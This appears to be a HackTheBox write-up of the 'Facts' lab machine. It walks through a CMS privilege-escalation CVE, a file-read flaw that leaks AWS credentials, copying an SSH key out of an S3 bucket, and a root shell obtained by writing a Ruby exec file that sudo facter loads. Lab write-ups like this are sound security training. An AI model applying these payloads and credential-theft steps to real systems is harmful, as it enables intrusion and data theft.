---
layout: default
title: "HTB - Facts"
---

# 🧠 HackTheBox – Facts

---

## 🎯 Objective

The objective of this machine is to gain initial access through a vulnerable web application, escalate privileges via cloud misconfiguration (AWS S3), and ultimately achieve root access through a Linux privilege escalation vector.

---

## 📌 Summary

Facts is an easy-difficulty machine demonstrating a full attack chain:

- Web exploitation (Camaleon CMS 2.9.0)
- Cloud misconfiguration (AWS S3)
- Credential exposure (SSH key leakage)
- Privilege escalation (sudo facter abuse)

Initial access is achieved via an exposed `/admin/register` endpoint allowing user creation, followed by exploitation of a CMS vulnerability to gain administrative access.

Post-exploitation reveals AWS credentials, which lead to an exposed S3 bucket containing an SSH private key. The key is cracked and used for SSH access.

Privilege escalation is achieved by abusing a misconfigured `sudo` rule involving the `facter` binary.

---

## 🧭 Attack Path (Clickable)

<ul>
  <li><a href="#recon">🔍 Reconnaissance</a></li>
  <li><a href="#web">🌐 Web Exploitation</a></li>
  <li><a href="#cloud">☁️ Cloud Misconfiguration</a></li>
  <li><a href="#ssh">🔐 SSH Access</a></li>
  <li><a href="#priv">⚡ Privilege Escalation</a></li>
  <li><a href="#root">👑 Root Access</a></li>
</ul>

---

## 🌐 Host Setup {#recon}

Add target to hosts file:

```bash
echo "10.129.35.249 facts.htb" | sudo tee -a /etc/hosts
```

🌐 Web Exploitation {#web}

A user account was created:

Username: mew1222
Password: mew121212

Findings:

CMS vulnerability (CVE-2025-2304)
Mass assignment leading to privilege escalation

Result:

Administrative access achieved
☁️ Cloud Misconfiguration {#cloud}

A file read vulnerability (CVE-2024-46987) exposed AWS credentials.

This allowed access to an internal S3 environment.

📦 S3 Bucket Access
Enumerate Buckets
```bash
aws --endpoint-url http://facts.htb:54321 s3 ls
```
Buckets discovered:

internal
randomfacts
Retrieve SSH Key
aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/id_ed25519 .
chmod 600 id_ed25519
🔐 SSH Access {#ssh}

Login using extracted key:

ssh -i id_ed25519 trivia@facts.htb

Passphrase:

dragonballz

Result:

User shell access obtained
👤 User Flag
```bash
cat /home/william/user.txt
```

⚡ Privilege Escalation {#priv}
```bash
Sudo Check
sudo -l
```
Vulnerable Command
```bash
sudo /usr/bin/facter --custom-dir /tmp
```
Vulnerability
facter loads Ruby scripts from writable directory
allows arbitrary code execution as root
Exploit
```bash
echo 'exec("/bin/sh")' > /tmp/x.rb
sudo /usr/bin/facter --custom-dir /tmp
```
👑 Root Access {#root}
```bash
cat /root/root.txt
```

📌 Key Takeaways
CMS vulnerabilities → initial access
Cloud misconfigurations → credential leaks
S3 misconfigurations → sensitive data exposure
sudo misconfiguration → privilege escalation

🧠 Summary

This machine demonstrates a realistic enterprise attack chain:
Web → Cloud → Credentials → SSH → PrivEsc → Root
